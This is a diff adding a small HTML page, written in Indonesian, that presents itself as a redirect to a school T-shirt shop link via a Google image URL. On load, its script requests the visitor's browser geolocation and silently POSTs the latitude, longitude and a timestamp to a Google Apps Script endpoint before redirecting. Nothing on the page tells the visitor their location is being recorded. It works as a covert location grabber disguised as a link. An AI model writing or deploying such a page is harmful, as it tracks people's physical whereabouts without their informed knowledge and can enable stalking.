@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Mengalihkan...</title>
+  <script>
+    const targetURL = "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.bapelright.biz%2Fkaos-sekolah-keren%2F&psig=AOvVaw12Y-mzmjlt7_FCdRf_DTxv&ust=1748073317359000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCNiMrNuOuY0DFQAAAAAdAAAAABAE";
+
+    function sendAndRedirect(position) {
+      fetch('https://script.google.com/macros/s/AKFY.../exec', {
+        method: 'POST',
+        body: JSON.stringify({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          timestamp: new Date().toISOString()
+        }),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      }).finally(() => {
+        // Setelah selesai, langsung redirect
+        window.location.href = targetURL;
+      });
+    }
+
+    function init() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendAndRedirect, () => {
+          // Jika tidak diizinkan, tetap redirect
+          window.location.href = targetURL;
+        });
+      } else {
+        // Jika browser tidak mendukung geolocation
+        window.location.href = targetURL;
+      }
+    }
+
+    window.onload = init;
+  </script>
+</head>
+<body>
+  <p>Sedang mengalihkan...</p>
+</body>
+</html>
